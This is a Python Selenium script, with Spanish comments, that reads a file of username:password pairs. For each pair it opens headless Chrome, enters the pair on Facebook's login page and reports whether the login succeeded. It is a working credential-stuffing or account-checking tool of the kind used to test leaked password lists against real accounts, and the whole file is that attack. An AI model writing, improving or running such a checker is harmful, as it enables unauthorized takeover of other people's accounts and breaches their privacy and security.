from selenium import webdriver
from selenium.webdriver.common.by import By
import sys
import time
from msedge.selenium_tools import EdgeOptions, Edge
from selenium.webdriver.common.keys import Keys

accountsTest = []
 
if len(sys.argv) != 3:
    print("Use => %s <filename> <out>" % sys.argv[0])
    # print(len(sys.argv))
    sys.exit();

def test_facebook(usr,password):
    driver_location = '/usr/bin/chromedriver'
    binary_location = '/usr/bin/google-chrome'

    options = webdriver.ChromeOptions()
    options.add_argument('--headless')
    options.add_argument('--no-sandbox')
    options.add_argument('--disable-dev-shm-usage')
    options.binary_location = binary_location

    driver = webdriver.Chrome(executable_path=driver_location,options=options)
    # Navega hasta la página de inicio de sesión de Facebook
    driver.get('https://www.facebook.com/login/')
    time.sleep(3)

    # Encuentra los elementos de formulario de inicio de sesión
    email_field = driver.find_element_by_id('email')
    password_field = driver.find_element_by_id('pass')
    # submit   = driver.find_element(By.ID,"loginbutton")
    # Ingresa las credenciales de inicio de sesión
    email_field.send_keys(usr)
    password_field.send_keys(password)
    time.sleep(3)
    
    # password_field.send_keys(Keys.ENTER)
    # Haga clic en el botón de inicio de sesión
    
    source = driver.page_source
    # print(source)
    writeFile(source)
    driver.find_element_by_id("loginbutton").click()
    # Verifica si el inicio de sesión fue exitoso
    
    try:
        print("Intentandoo")
        driver.find_element(By.ID, 'userNavigationLabel')
        print("Inicio de sesión exitoso")
    except:
        print("Usuario o contraseña inválidos")

    # Cierra la ventana del navegador
    driver.quit()

def readFile():
    filename = open(sys.argv[1]) 
    lines = filename.readlines()
    
    for item in lines:
        textLine = item.split(":")
        accountsTest.append({
            'account':textLine[0],
            'passw':textLine[1]
        })

def writeFile(text):
     file1 = open("out/{0}".format("prueba.html"),'a+')
     file1.write(text)
     file1.close()
readFile()
for account in accountsTest:
    # time.sleep(3)
    print("Probando {}:{}".format(account['account'],account['passw']))
    test_facebook(account['account'],account['passw'])